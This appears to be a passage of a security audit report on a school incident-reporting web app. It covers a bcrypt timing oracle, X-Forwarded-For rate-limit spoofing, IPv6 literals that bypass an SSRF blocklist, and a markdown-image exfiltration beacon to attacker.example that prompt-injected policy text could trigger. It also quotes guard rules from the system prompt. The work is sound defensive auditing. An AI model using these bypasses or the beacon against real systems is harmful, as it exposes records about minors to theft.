# Security pass — 2026-09-08

Branch `audit/2026-09-08`. Read-only; no source changed, no script run against a
database.

**Counts:** 0 blocker · 5 major · 7 minor.

The authentication and authorization layer built after 2026-08-31 holds. Every
route under `src/app/api/**` re-checks the session in its own handler, every
by-id lookup is scoped, out-of-scope ids return 404, no route reads a user id
from a body, query string or header, and the cross-user scope property is
regression-tested against real foreign ids. I found **no cross-user data
access, no auth bypass and no path traversal.** The findings below are a
defeated timing control, a bypassable rate-limit key, a bypassable SSRF
blocklist, an untrusted-text egress channel, and an infrastructure exposure.

---

## Findings

### SEC-30 — The bcrypt dummy hash is cost 10 while real hashes are cost 12, so sign-in timing tells an attacker which accounts exist

- **Severity:** major
- **Location:** `src/auth.ts:50` (the dummy hash), used at `src/auth.ts:33-34`;
  real hashes minted at `scripts/create-user.ts:54`
- **Requirement:** the control the code states for itself —
  `src/auth.ts:30-32`: *"Compare against a dummy hash when the user is absent or
  has no password set, so the response time does not reveal which accounts
  exist."* The e2e suite asserts a sign-in 429 "with a `Retry-After` that leaks
  nothing about whether the account exists" (`docs/roadmap.md:306` block); the
  same discretion is meant to hold for the 401 path.
- **Finding:** `DUMMY_HASH` is `'$2a$10$N9qo8uLOick…'` — work factor **10**.
  `scripts/create-user.ts:54` hashes real passwords with
  `bcrypt.hash(password, 12)` — work factor **12**, four times the work. So a
  `POST /api/auth/callback/credentials` for an address with no account returns
  measurably sooner than one for an address that exists, whatever the password.
  Benchmarked in this checkout with the repo's own `bcryptjs`: 69.2 ms average
  for the cost-10 dummy against 280.6 ms for a cost-12 real hash — a ~211 ms
  separation, an order of magnitude above network jitter and visible in a single
  request pair. The equalisation the comment describes is not merely imperfect;
  it is inverted into a clean oracle, because the *absent* case is now the fast
  one. Ten attempts per five minutes per key (`RATE_LIMITS.SIGN_IN`) is ample
  for enumeration, and SEC-31 below removes even that bound. On a K-12 system the
  enumerated set is the district's staff directory paired with confirmation of
  who holds an account in an incident-reporting tool.
  The e2e environment hides this: `e2e/support/seed.ts:43` seeds at cost 10, so
  test and dummy costs coincide and no timing difference exists under test.
- **Proposed fix:** define the dummy hash at the same cost the app mints —
  regenerate it with `bcrypt.hash(<random>, 12)` — and derive both from one
  exported constant (`export const BCRYPT_COST = 12`) used by `src/auth.ts`,
  `scripts/create-user.ts` and `e2e/support/seed.ts`, so the two can never drift
  again. A unit test asserting `DUMMY_HASH.startsWith('$2a$' + BCRYPT_COST)`
  pins it.

### SEC-31 — The sign-in rate limit is keyed on a client-supplied header, so the bcrypt DoS and password-guessing bounds can be lifted at will

- **Severity:** major
- **Location:** `middleware.ts:27-31` (`clientAddress`), consumed at
  `middleware.ts:43`
- **Requirement:** the limiter exists because *"a few hundred a minute make the
  app unavailable to every administrator, while also giving unbounded password
  guessing"* (`middleware.ts:19-22`). A limit an attacker can reset is not a
  limit. `docs/roadmap.md:408` records the per-process counter as the known
  weakness; the key's trustworthiness is not recorded anywhere.
- **Finding:** `clientAddress` returns `request.headers.get('x-forwarded-for')`
  split on `,` and takes **entry zero**, falling back to `x-real-ip`. The
  comment at `middleware.ts:24-26` asserts *"its first entry is the one the edge
  saw"*. That is backwards: a proxy that appends puts the address it observed
  **last**, and entry zero is whatever the client wrote. So
  `POST /api/auth/callback/credentials` with `X-Forwarded-For: <random>` gets a
  fresh 10-request window per random value — the counter is keyed by attacker
  input.
  Verifiable from this repo without knowing the ingress: `docker-compose.yml:40-41`
  publishes `3000:3000` with no proxy in front, so in the documented local and
  self-hosted stack `x-forwarded-for` is *entirely* client-supplied and the
  limiter is bypassed with one header. On Azure Container Apps the Envoy ingress
  appends rather than replaces, so entry zero is still client-controlled there;
  I could not test the deployed ingress, so treat that half as
  **unverified-but-likely** and the compose case as verified. Either way the
  spoofed key restores exactly what the limiter was written to stop: unbounded
  online guessing, and unbounded cost-12 bcrypt on the single event loop of a
  single replica — which is every administrator, mid-incident.
  It also gives an attacker a memory-growth lever against `evictExpired`
  (`src/lib/rate-limit.ts:46-50`): unique keys accumulate for up to the window
  length, and the eviction sweep runs at most once a minute.
- **Proposed fix:** take the **last** entry of `x-forwarded-for` (the one the
  nearest trusted hop wrote), or better, a configured hop count —
  `XFF_TRUSTED_HOPS`, defaulting to 1 — indexing from the right, and fall back
  to `request.ip`/`x-real-ip` rather than to the literal `'unknown'` (which
  today collapses every un-proxied caller onto one shared counter). Add a second
  counter keyed on the submitted email address so guessing one account is
  bounded even from rotating addresses. Extend the existing flood e2e to send a
  rotating `X-Forwarded-For` and still expect a 429 — that test fails today.

### SEC-32 — The SSRF blocklist misses IPv4-mapped IPv6 in hex form, so loopback and link-local are reachable through `safeFetchText`

- **Severity:** major
- **Location:** `src/lib/safe-fetch.ts:43-53` (`isBlockedIPv6`), specifically the
  mapped-address branch at `:49-51`; reached from `assertSafeUrl`
  `src/lib/safe-fetch.ts:84-89`; sole caller
  `src/app/api/admin/policies/upload/route.ts:113`
- **Requirement:** the module's own contract —
  `src/lib/safe-fetch.ts:62-64`: *"Rejects the URL unless it is https and every
  address its hostname resolves to is publicly routable."* SEC-4 is recorded as
  knowingly partial for **DNS rebinding only** (`docs/roadmap.md:410`); a static
  literal that the blocklist simply fails to classify is a different defect, not
  the accepted one.
- **Finding:** `isBlockedIPv6` judges a non-canonicalised string with
  `===`/`startsWith` and one regex, and the regex matches the mapped form only
  in dotted-quad notation: `/^::ffff:(\d+\.\d+\.\d+\.\d+)$/`. The WHATWG URL
  parser does **not** rewrite the hex form into dotted form. Verified in this
  checkout with Node and the repo's own predicate logic:

  | URL host literal | `new URL(...).hostname` | classified blocked? |
  |---|---|---|
  | `[0:0:0:0:0:0:0:1]` | `[::1]` | yes (URL canonicalises it) |
  | `[::ffff:127.0.0.1]` | `[::ffff:127.0.0.1]` | yes (regex hits) |
  | **`[::ffff:7f00:1]`** | `[::ffff:7f00:1]` | **no** |
  | **`[0:0:0:0:0:ffff:127.0.0.1]`** | `[::ffff:7f00:1]` | **no** |
  | **`[2002:7f00:1::]`** (6to4) | `[2002:7f00:1::]` | **no** |

  `::ffff:7f00:1` *is* 127.0.0.1, and `::ffff:a9fe:a9fe` is 169.254.169.254 —
  the cloud-metadata address the module's own header comment names as the thing
  it exists to block (`src/lib/safe-fetch.ts:7-10`). Request shape: an admin
  `POST /api/admin/policies/upload` with
  `url=https://[::ffff:7f00:1]:8000/api/v1/collections` and a text content type
  fetches an internal service and stores its body as policy `content`, readable
  back through `GET /api/admin/policies/[id]`. The https-only rule narrows the
  reachable set considerably — plain-http IMDS is out — but it does not narrow
  it to nothing, and the blocklist is the control that was supposed to.
  Privilege required is `requireRole('admin')`, which is why this is major and
  not a blocker.
- **Proposed fix:** normalise before judging. Do not pattern-match the string:
  expand the address to its 16 bytes (`net.isIPv6` plus a parser, or
  `ip6.toBuffer`), and if the first 10 bytes are zero and bytes 10-11 are
  `0xffff`, hand bytes 12-15 to `isBlockedIPv4`. Block `2002::/16` and
  `2001:0::/32` (6to4/Teredo) explicitly, and switch the IPv6 check from
  prefix strings to CIDR containment so a new notation cannot slip past again.
  The hostname allowlist recorded in `docs/roadmap.md:410` would subsume all of
  this and is still the stronger control.

### SEC-33 — Model output is rendered as markdown with the default image handler and no CSP, giving prompt-injected text a data-egress channel out of an administrator's browser

- **Severity:** major
- **Location:** `src/components/design/GuidanceBlock.tsx:18-74` — the
  `components` map overrides `h1 h2 h3 p ul ol li strong em a code blockquote hr
  table th td` and **not** `img`; rendered at `src/app/chat/page.tsx:520`,
  `src/app/incidents/[id]/page.tsx:312` and `:456`. No response headers are set
  anywhere: `next.config.ts:1-17` has no `headers()`, `middleware.ts:63-72` adds
  none.
- **Requirement:** *"It handles incident reports about minors. Confidentiality
  and correctness are safety-critical"* (`CLAUDE.md:7-9`). SEC-25 — retrieved
  policy text concatenated into the system prompt unfenced — is a recorded open
  major (`docs/audit/2026-09-01-findings.md:363-369`); this finding is the other
  half of it, the part that turns influence over the model into egress.
- **Finding:** `react-markdown` renders `![](url)` as a real `<img src>` when
  `img` is not overridden, and the browser fetches it on render. So any text the
  model emits of the form `![](https://attacker.example/?d=<text>)` causes the
  viewer's browser to make an outbound request carrying whatever the model put in
  the query string. There is no `Content-Security-Policy` to stop it, and the
  assistant turn is **persisted** (`src/app/api/chat/route.ts:221-233`), so the
  beacon re-fires for every later viewer of that incident, including an
  investigator or admin who opens the file.
  Two footholds reach it. The stronger one is SEC-25: policy text lands inside
  the `system` parameter (`src/lib/ai/claude-service.ts:279`) and a
  `mandatory_reporting` chunk is guaranteed in every consultation
  (`src/lib/ai/rag.ts:326-333`), so one poisoned excerpt influences essentially
  every answer — and policy text can arrive from a remote document via
  `safeFetchText`, i.e. from outside the district. The weaker one is a reporter's
  own incident text, which reaches the model as a user turn; that self-exfiltrates
  its own incident but also plants a beacon that fires in the browser of whoever
  reads the file later. What escapes is bounded by what the model will restate —
  incident text and retrieved policy, not another user's rows, and not the
  session cookie (a cross-origin `<img>` sends none). I did not find a path to
  another user's data, so I am not filing this as a blocker.
- **Proposed fix:** two independent changes, both cheap. (1) Override `img` in
  `GuidanceBlock` to render nothing — or the alt text as plain text; guidance has
  no legitimate images. (2) Add a `headers()` block in `next.config.ts` with a
  `Content-Security-Policy` whose `img-src`/`connect-src`/`frame-src` are
  `'self'` and `default-src 'self'`, so a future markdown sink cannot reopen the
  channel. Consider also overriding `a` to drop non-`https:`/off-origin hrefs, or
  at least to render them without making them auto-loading.

### SEC-34 — The Postgres holding every incident record is reachable from any Azure tenant's compute, and the app connects to it as the server administrator

- **Severity:** major
- **Location:** `deploy/azure/provision.sh:35-39` (`--public-access 0.0.0.0`),
  the reassuring comment at `:43-44`, the connection string at `:68`; consumed as
  the app's `DATABASE_URL` at `deploy/azure/containerapp.template.yaml:23-24`,
  `:37-38`
- **Requirement:** *"It handles incident reports about minors"*
  (`CLAUDE.md:7`), and the deploy files' own care elsewhere about student-record
  durability (`deploy/azure/env.example:23-24`,
  `containerapp.template.yaml:55-58`). Network exposure of the store deserves the
  same standard as exposure of the mount.
- **Finding:** two things, one dependent on the other.
  First, `--public-access 0.0.0.0` creates the Azure firewall rule
  `0.0.0.0-0.0.0.0`, which is the *"allow public access from any Azure service
  within Azure"* toggle. The comment at `:43` says *"allows Azure services only,
  not the internet"* — true, and materially understating it: that setting admits
  compute in **any Azure subscription, any tenant**, not only this deployment's.
  So the only thing between a Postgres full of incident records about minors and
  a VM anybody can rent is one password, with no VNet integration, no private
  endpoint and no per-source rule. `sslmode=require` (`:68`) protects the
  transport, not the perimeter.
  Second, that password is the **server administrator's** (`PG_ADMIN_USER`,
  `deploy/azure/env.example:18`), and the running app uses it — so a compromise
  of the app process, or of the rendered secret, is full DDL over the database
  rather than DML on the app's tables. There is no application-scoped role. This
  also removes any barrier between an operational mistake and the schema; the
  repo already has one production incident from a script running against an
  unmigrated production schema (`CLAUDE.md:43-46`).
  I could not inspect the live server's rules, so the exposure is
  **verified in the provisioning script, unverified against the deployed
  resource** — someone may have tightened it by hand.
- **Proposed fix:** provision with `--public-access None` and reach the server
  over a private endpoint or VNet-integrated Container Apps environment. If
  public access must stay for the pilot, replace the `0.0.0.0` rule with explicit
  outbound addresses. Independently, create a non-superuser role owning only the
  app's schema and put *that* in the app's `DATABASE_URL`, leaving the admin
  credential for the migration job alone. Correct the comment at `:43-44` — it is
  the kind of reassurance that stops the next reader from looking.

### SEC-35 — `safeFetchText` measures the response body after buffering it, the exact mistake SEC-10 was fixed for on the upload path

- **Severity:** minor
- **Location:** `src/lib/safe-fetch.ts:156-165`; compare the fix that exists at
  `src/lib/uploads.ts:104-136`
- **Requirement:** the reasoning already written down in this repo —
  `src/lib/uploads.ts:88-93`: Content-Length *"is not sufficient on its own — it
  is absent under chunked transfer encoding and it can simply lie — so the body
  is also piped through a counter that errors the moment the ceiling is
  passed."*
- **Finding:** `safeFetchText` checks the declared `content-length` against
  `maxBytes` (`:156-159`) and then calls `await response.arrayBuffer()`
  (`:161`), checking the real length only afterwards (`:162-164`). A server that
  omits Content-Length (trivial — chunked) or lies about it streams unbounded
  bytes into the process before the check runs. `maxUploadBytes()` is passed as
  the cap (`src/app/api/admin/policies/upload/route.ts:113`), so the intent is a
  10 MB ceiling; the actual ceiling is whatever the remote host sends. At one
  replica with 2 GiB (`containerapp.template.yaml:33-35`) that is an OOM that
  takes the app away from every administrator. Trigger requires an admin to fetch
  an attacker-influenced URL, which is why this is minor rather than major — but
  a compromised or hostile *policy source* is precisely the threat `safe-fetch`
  was written for, and the 10-second timeout (`:21`) does not bound bytes.
- **Proposed fix:** reuse the pattern that already exists. Pipe
  `response.body` through the same counting `TransformStream` as
  `readCappedFormData`, erroring the stream past `maxBytes`, then read text from
  the wrapped stream. Better still, extract that counter from `uploads.ts` into
  one shared helper so there is a single implementation of "read at most N
  bytes".

### SEC-36 — Four admin write handlers still hand-roll truthiness checks while the zod schemas written for them sit unimported, and two carry no rate limit

- **Severity:** minor
- **Location:** unused schemas at `src/lib/validation.ts:61-70`
  (`createPolicySchema`), `:74-82` (`updatePolicySchema`), `:87-92`
  (`createPromptSchema`), `:96-101` (`updatePromptSchema`), `:106-117`
  (`fileUploadSchema`) — verified zero importers across `src/`, `e2e/`,
  `scripts/`. Handlers: `src/app/api/admin/policies/route.ts:48-57`,
  `src/app/api/admin/policies/[id]/route.ts:59-60`,
  `src/app/api/admin/prompts/route.ts:48-57`,
  `src/app/api/admin/prompts/[id]/route.ts:51-52`
- **Requirement:** SEC-13's finding, and the resolution recorded for it —
  *"They are the correct target shape for the hand-rolled validation, so adopting
  them fixes SEC-13 and converts dead code into the fix"*
  (`docs/audit/2026-08-31-findings.md:891`). It was adopted for incidents and
  chat and never for policies or prompts.
- **Finding:** `POST /api/admin/policies` checks `if (!title || !content ||
  !effectiveDate)` and passes all three to Prisma with no type or length
  constraint; `keywords` and `description` are `JSON.stringify`d from whatever
  the body held (`:77-80`). `PUT /api/admin/policies/[id]` validates only the
  facets and the date, spreading `title`, `content`, `isActive` and `metadata`
  through untyped (`:83-97`). Both prompt write handlers validate nothing beyond
  truthiness — `updatePromptSchema`'s `content: z.string().min(10)` exists and is
  unused, so `PUT /api/admin/prompts/[id]` will happily set the advisor profile
  that governs every mandated-reporting consultation to `"x"`. Neither
  `POST /api/admin/policies` nor either prompt route calls `enforceRateLimit`,
  although the policy route drives `ragSystem.addPolicyDocument` and therefore
  billed embedding calls proportional to a body with no size bound (App Router
  `request.json()` imposes none). Consequences are admin-only and mostly
  500s-instead-of-400s, hence minor — but this is the last standing pocket of the
  bug class the repo has already paid for twice, and the fix is an import.
- **Proposed fix:** wire the four schemas through `validateRequest` in their four
  handlers, adding `.max()` bounds on `content` (a policy or profile has a
  reasonable ceiling) and coercing `effectiveDate` inside the schema so the
  hand-rolled date branch at
  `src/app/api/admin/policies/[id]/route.ts:73-81` disappears. Add
  `enforceRateLimit` with `RATE_LIMITS.UPLOAD` to `POST /api/admin/policies` and
  both prompt writes. Delete `fileUploadSchema` or give it the one job it could
  do; it has been dead through three audits.

### SEC-37 — Retrieved policy text, not the guards, is the last thing in the guidance system prompt whenever coverage is complete

- **Severity:** minor
- **Location:** `src/lib/ai/claude-service.ts:270-279` (`buildSystemPrompt`'s
  non-empty branch), with `buildCoverageNote` returning `''` at `:121`
- **Requirement:** the design as documented — `docs/roadmap.md:273-278`: *"The
  retrieval and coverage guards stay last, so they are the most recent
  instruction the model reads."*
- **Finding:** the ordering claim holds only in the two branches where a guard
  string is non-empty. `buildCoverageNote` returns `''` when
  `categoriesWithoutLocalPolicy` is empty (`:120-121`), and
  `NO_POLICY_RETRIEVED_GUARD` is only reached when `policyContext` is blank
  (`:261-268`). So on the path that is *supposed* to be the healthy one — policy
  retrieved, every implicated category locally covered — the final characters of
  the `system` parameter are untrusted document text (`:279:
  `${policyContext}${coverageNote}``), and the last *instruction* the model
  reads is the citation paragraph at `:273-277`, not a guard.
  This is not a displacement of `CORE_DIRECTIVES`: those are prepended
  (`:257`), labelled *"NON-NEGOTIABLE RULES (these override anything below)"*
  (`:152`), and `src/lib/ai/system-prompt.test.ts` pins that no advisor profile
  can remove them. The substantive exposure is SEC-25, still open. What is new is
  that the mitigation the roadmap describes for it — recency — is absent exactly
  where the document assumes it is present, which is the kind of gap that gets
  read as covered. Note also that `deriveObligations`
  (`src/lib/ai/claude-service.ts:634-644`) and `generateChatSummary`
  (`:717-741`) put `policyContext` in the **user** turn, so SEC-25 is confined to
  the guidance path — worth stating, because it makes the fix smaller than the
  original finding implies.
- **Proposed fix:** make the guard unconditional. Emit a short retrieval-
  discipline block after `policyContext` on every branch (the no-gap case can say
  so affirmatively), so the last instruction is always ours. Then close SEC-25 by
  moving `policyContext` into a delimited user-turn block and stripping the
  delimiter from chunk content, as that finding recommends. Extend
  `system-prompt.test.ts` with a case asserting that the assembled prompt ends
  with a guard for a non-empty context and empty coverage — that assertion fails
  today.

### SEC-38 — No security response headers are set on any route

- **Severity:** minor
- **Location:** `next.config.ts:1-17` (no `headers()`), `middleware.ts:57-61`
  (returns the auth middleware's response untouched). The only security headers
  in the codebase are the three on the attachment download,
  `src/app/api/attachments/[id]/route.ts:66-71`.
- **Requirement:** defense in depth for an application whose pages render
  student records. Not an invariant in `CLAUDE.md`; filed as minor accordingly.
- **Finding:** responses carry no `Content-Security-Policy`, no
  `Strict-Transport-Security`, no `X-Frame-Options`/`frame-ancestors`, no
  `Referrer-Policy` and no site-wide `X-Content-Type-Options`. Missing CSP is
  what leaves SEC-33 unmitigated at the second layer. Missing HSTS means a first
  visit over http is downgradeable even though the ingress sets
  `allowInsecure: false` (`containerapp.template.yaml:15`) — the redirect
  protects the connection, HSTS protects the *next* one. Framing and cross-origin
  referrer leakage are largely handled already by accident rather than intent:
  the session cookie is `SameSite=Lax` and host-only (`src/auth.config.ts:73-83`)
  so a framed app renders logged out, and modern browsers default to
  `strict-origin-when-cross-origin`. Relying on browser defaults for a
  student-record UI is thin.
- **Proposed fix:** add a `headers()` block in `next.config.ts` applying, to all
  paths: `Content-Security-Policy` (`default-src 'self'`, `img-src 'self' data:`,
  `connect-src 'self'`, `frame-ancestors 'none'`, `base-uri 'none'`,
  `form-action 'self'` — Next's inline bootstrap needs a nonce or
  `'strict-dynamic'`, so stage it with `Content-Security-Policy-Report-Only`
  first), `Strict-Transport-Security: max-age=31536000; includeSubDomains`,
  `Referrer-Policy: strict-origin-when-cross-origin`,
  `X-Content-Type-Options: nosniff`, and
  `Permissions-Policy: camera=(), microphone=(), geolocation=()`.

### SEC-39 — `GET /api/incidents/[id]` returns whole `Attachment` rows, including the on-disk name the upload route's comment says is never exposed

- **Severity:** minor
- **Location:** `src/app/api/incidents/[id]/route.ts:44-46` (the unprojected
  `attachments` include); the claim it contradicts is at
  `src/app/api/attachments/upload/route.ts:88-89`
- **Requirement:** SEC-27's rule, applied to one entity and not its neighbour —
  *"`GET /api/policies` returned whole rows, including absolute server paths, to
  any authenticated user"* (`docs/roadmap.md:266-267`), fixed there by an
  explicit projection with the comment *"The library page uses six fields"*
  (`src/app/api/policies/route.ts:31-42`).
- **Finding:** the incident detail response includes `attachments` with no
  `select`, so every field ships: `filePath`, `fileType`, `fileSize`,
  `uploadedBy`, `incidentId`, timestamps. `filePath` is the stored basename
  (`<uuid>.<ext>`, `src/app/api/attachments/upload/route.ts:77-78`) — **not** an
  absolute path, so this is genuinely milder than SEC-27 was, and the file itself
  stays unreachable except through `GET /api/attachments/[id]`. But the upload
  route states *"The download URL is derived from the row id, so the on-disk
  layout is never exposed to the client"*, and that is false: the client is
  handed the on-disk name on every incident open. The response is scoped, so no
  cross-user exposure — the cost is a false comment and a projection that will
  leak whatever column `Attachment` gains next.
- **Proposed fix:** project the include to what
  `src/app/incidents/[id]/page.tsx` actually reads — `id`, `filename`,
  `fileSize`, `fileType`, `createdAt` — and correct the comment at
  `src/app/api/attachments/upload/route.ts:88-89`, or make it true. Apply the
  same treatment to `conversations` and `complianceActions` in the same include
  while the reasoning is fresh.

### SEC-40 — Dead prompt builders in `llm-service.ts` assemble guidance with no core directives and no retrieval guard

- **Severity:** minor
- **Location:** `src/lib/ai/llm-service.ts:32-76` (`generateResponse`) and
  `:158-188` (`streamResponse`); the prompt they use is `:130-152`. Verified zero
  callers in `src/` and `scripts/` — the live path is
  `generateSchoolComplianceResponse` (`:81-125`), called only from
  `src/app/api/chat/route.ts:213`.
- **Requirement:** *"Never assert policy the system did not retrieve. If
  retrieval returns nothing, the prompt gets an explicit instruction not to cite
  policy codes or state district deadlines. Don't remove that guard."*
  (`CLAUDE.md:60-62`)
- **Finding:** both functions build their own system prompt as
  `` `${systemPrompt}\n\nRelevant Policy Context:\n${policyContext}` ``
  (`:50-52`, `:173-174`) from `getDefaultSystemPrompt()`, which contains neither
  `CORE_DIRECTIVES` nor `NO_POLICY_RETRIEVED_GUARD` and does instruct *"Cite
  specific policies when possible"* and *"Highlight legal requirements and
  deadlines"* (`:136-137`) with no requirement that either be retrieved. There is
  no empty-context branch, so a blank `policyContext` yields the header with
  nothing under it — the precise shape FLOW-3/SPEC-3 was fixed for in
  `buildSystemPrompt`. Nothing calls them today, so nothing is broken now; the
  hazard is that they are the obvious-looking entry points on the service the
  chat route imports, one wiring change from violating a named invariant behind a
  200. TEST-48 recorded the error-swallowing half of `:32-76`
  (`docs/audit/2026-09-01-findings.md:526-528`); the missing-guard half is not
  recorded.
- **Proposed fix:** delete both functions and `getDefaultSystemPrompt`. If a
  streaming path is wanted later, build it on `buildSystemPrompt` so the guards
  come for free. If they must stay, route them through `buildSystemPrompt` now.

### SEC-41 — Attachment read access is granted by a past upload rather than by current scope

- **Severity:** minor
- **Location:** `src/app/api/attachments/[id]/route.ts:36-39`
- **Requirement:** *"Scope every by-id lookup. `incidentScope(user)` — reporters
  see only what they filed."* (`CLAUDE.md:56-57`)
- **Finding:** the permission predicate is a three-way OR:
  `canReadAllIncidents(user) || attachment.incident?.reporterId === user.id ||
  attachment.uploadedBy === user.id`. The third clause is not derived from
  `incidentScope`, so it grants access on the strength of a historical act rather
  than present authority. Concretely: an investigator or admin attaches a
  document to a reporter's incident, is later demoted to `reporter`, and retains
  read access to that file on an incident they cannot otherwise see. I traced
  whether a user could plant such a row on a foreign incident — they cannot:
  `POST /api/attachments/upload` gates on `incidentScope`
  (`src/app/api/attachments/upload/route.ts:50-52`), so `uploadedBy` can only be
  someone who was in scope at the time. So this is a scope that fails to shrink,
  not a scope that can be forged, and given SEC-19 (roles are never re-read from
  the database) it is currently the smaller of the two revocation gaps.
  `attachment.incident?.reporterId` uses optional chaining although
  `Attachment.incident` is a required relation, which suggests the clause was
  written defensively rather than deliberately.
- **Proposed fix:** drop the `uploadedBy` clause and scope through the incident
  like every other by-id lookup: `prisma.attachment.findFirst({ where: { id,
  incident: incidentScope(guard.user) } })`, then 404. That collapses the
  predicate into the one function `CLAUDE.md` names and removes the need for the
  optional chain. Add an e2e asserting a 404 for an attachment on a foreign
  incident — the current suite covers foreign incidents and obligations but not
  attachments.

---

## Route inventory

Every row verified by reading the handler. "Scoped" means a by-id lookup is
constrained by `incidentScope(user)` (or a hard session-derived filter) and
returns 404 rather than 403 when it misses.

| Route | Methods | Session recheck in handler | Role gate in handler | Scoped | Body/params validated | Rate limited |
|---|---|---|---|---|---|---|
| `/api/health` | GET | no — deliberately public, returns a fixed literal (`:19-21`) | n/a | n/a | no input | no |
| `/api/auth/[...nextauth]` | GET, POST | is the auth endpoint | n/a | n/a | yes — `credentialsSchema`, `src/auth.ts:8-11`, `:22` | yes — `middleware.ts:41-55`, **key spoofable (SEC-31)** |
| `/api/incidents` | GET | `requireUser` `:15` | n/a | yes — `incidentScope` `:44`; `reporterId` narrows only, gated on `canReadAllIncidents` `:54` | partial — `paginationSchema` `:25`; `status` passed through un-enumerated `:51-53` | no |
| `/api/incidents` | POST | `requireUser` `:113` | n/a | yes — `reporterId: guard.user.id` `:129` | yes — `createIncidentSchema` `:116` | no |
| `/api/incidents/[id]` | GET | `requireUser` `:27` | n/a | yes — `findFirst` + scope `:32`, 404 `:54` | id from path | no |
| `/api/incidents/[id]` | PATCH | `requireUser` `:90` | n/a | yes — scope read before write `:109-117`, 404 | yes — `updateIncidentSchema` `:96` | no |
| `/api/incidents/[id]/summary` | POST | `requireUser` `:24` | n/a | yes — via `generateIncidentSummary` scope, `incident-summary.ts:37`, 404 `:36` | id from path | yes — CHAT `:27` |
| `/api/chat` | POST | `requireUser` `:26` | n/a | yes — `incidentScope` `:55`, 404 `:94-96` | yes — `chatMessageSchema` `:39` (no `userId` field) | yes — CHAT `:32` |
| `/api/chat/[incidentId]` | GET | `requireUser` `:14` | n/a | yes — `incidentScope` `:19`, 404 `:27-32` | id from path | no — and writes no audit row (prior SPEC-49) |
| `/api/chat/history` | GET | `requireUser` `:11` | n/a | yes — hard `reporterId: guard.user.id` `:16` | no input | no |
| `/api/chat/summary` | POST | `requireUser` `:20` | n/a | yes — via `generateIncidentSummary`, 404 `:36` | partial — hand-rolled `typeof` `:27-31` | yes — CHAT `:23` |
| `/api/obligations` | GET | `requireUser` `:20` | n/a | yes — `incident: incidentScope` `:29`; counts derive from the same scoped set `:62-89` | `window` compared to a literal `:23` | no |
| `/api/obligations/[id]` | PATCH | `requireUser` `:24` | n/a | yes — `incident: incidentScope` `:38`, 404 `:41` | yes — local `updateObligationSchema` `:11-13`, `:29` | no |
| `/api/attachments/upload` | POST | `requireUser` `:29` | n/a | yes — `incidentScope` `:51`, 404 `:54-59` | extension allowlist `:63`, size `:64`, capped read `:38`; no zod | yes — UPLOAD `:32` |
| `/api/attachments/[id]` | GET | `requireUser` `:23` | n/a | partial — ownership recheck `:36-39`, 404 `:43`; not via `incidentScope` (**SEC-41**) | id from path; containment asserted `:50` | no |
| `/api/policies` | GET | `requireUser` `:8` | n/a | n/a — policy library, not user data | yes — enum allowlists `:19-27`; explicit projection `:35-42` (SEC-27) | no |
| `/api/admin/policies` | GET | `requireRole('admin')` `:15` | yes | n/a | no input | no |
| `/api/admin/policies` | POST | `requireRole('admin')` `:45` | yes | n/a | partial — `policyFacetsSchema` `:62`; title/content/keywords/description unvalidated (**SEC-36**) | **no** — drives billed embeddings |
| `/api/admin/policies/[id]` | GET | `requireRole('admin')` `:20` | yes | n/a | id from path | no |
| `/api/admin/policies/[id]` | PUT | `requireRole('admin')` `:55` | yes | n/a | partial — facets `:63`, date `:73-81`; rest spread untyped (**SEC-36**) | no |
| `/api/admin/policies/[id]` | DELETE | `requireRole('admin')` `:143` | yes | n/a | id from path | no |
| `/api/admin/policies/upload` | POST | `requireRole('admin')` `:34` | yes | n/a | facets `:47`, extension `:84`, size `:85`, capped read `:43`, URL via `safeFetchText` `:113` (**SEC-32**, **SEC-35**); title/effectiveDate truthy only `:62` | yes — UPLOAD `:37` |
| `/api/admin/prompts` | GET | `requireRole('admin')` `:11` | yes | n/a | no input; projection excludes `content` `:19-27` | no |
| `/api/admin/prompts` | POST | `requireRole('admin')` `:45` | yes | n/a | **no** — truthiness only `:52-57`; `createdBy` from session `:66` (SEC-21) | no |
| `/api/admin/prompts/[id]` | GET | `requireRole('admin')` `:17` | yes | n/a | id from path | no |
| `/api/admin/prompts/[id]` | PUT | `requireRole('admin')` `:47` | yes | n/a | **no** (**SEC-36**); audit captures previous content `:59-62`, `:82-93` | no |
| `/api/admin/prompts/[id]` | DELETE | `requireRole('admin')` `:110` | yes | n/a | id from path; refuses the active row `:119-124` | no |

Two notes on the table. The admin **pages** (`/admin/policies`,
`/admin/prompt`) are client components with no server-side guard of their own —
they rely solely on `isAdminPath` in `src/auth.config.ts:29-31`. That is
tolerable only because every route they call is role-gated in its handler, which
is the invariant doing its job; a non-admin who reached the page would see an
empty shell of 403s.

The middleware matcher (`middleware.ts:70`) excludes any path ending in
`.svg|.png|.jpg|.jpeg|.gif|.webp|.ico`. A dynamic segment will happily match such
a suffix — `GET /api/attachments/abc.png` and
`GET /api/admin/policies/abc.png` both reach their handlers with the middleware
skipped. Both then return 401/403 from `requireUser`/`requireRole`. This is the
matcher mistake `CLAUDE.md:52-54` predicts, already live and already contained by
the handler re-check. Worth a test.

---

## What holds

Prior SEC findings verified still fixed, by reading the code rather than the
changelog:

- **SEC-1** (no auth) — deny-by-default in `src/auth.config.ts:89-118` plus a
  handler guard in all 19 route handlers; verified route by route in the
  inventory above.
- **SEC-2, SEC-3** (arbitrary file write via upload filename) — both write paths
  go through `safeUploadPath` (`src/lib/uploads.ts:157-164`): `randomUUID()` plus
  a validated extension, never `file.name`, with a `path.resolve` containment
  assertion. Validation precedes the write on the admin path
  (`src/app/api/admin/policies/upload/route.ts:84-95`). `POST /api/policies` —
  the route SEC-3 exploited — is gone, with the reasoning left in place
  (`src/app/api/policies/route.ts:56-62`).
- **SEC-4** (SSRF) — `safeFetchText` is in place and is the only fetch of a
  user-supplied URL: https-only, blocklist, per-hop redirect re-validation,
  content-type and timeout caps. DNS rebinding remains knowingly partial per
  `docs/roadmap.md:410`; the IPv6 notation gap is new and filed as SEC-32.
- **SEC-5** (attachments in `public/`) — files are written to
  `attachmentUploadsDir()` outside the served tree
  (`src/app/api/attachments/upload/route.ts:72`), served only through
  `GET /api/attachments/[id]` with a session and ownership recheck, and the UI
  links to `/api/attachments/${id}` (`src/app/incidents/[id]/page.tsx:450`) — no
  direct file URL anywhere. Download forces
  `application/octet-stream` + `nosniff` + `private, no-store`
  (`src/app/api/attachments/[id]/route.ts:64-72`), and the extension allowlist
  still excludes `.html`/`.svg` (`:22-25`). `Content-Disposition` interpolates
  `encodeURIComponent(filename)`, which encodes `"`, CR and LF, so no header
  injection.
- **SEC-6** (unauthenticated prompt control) — both prompt routes and all four
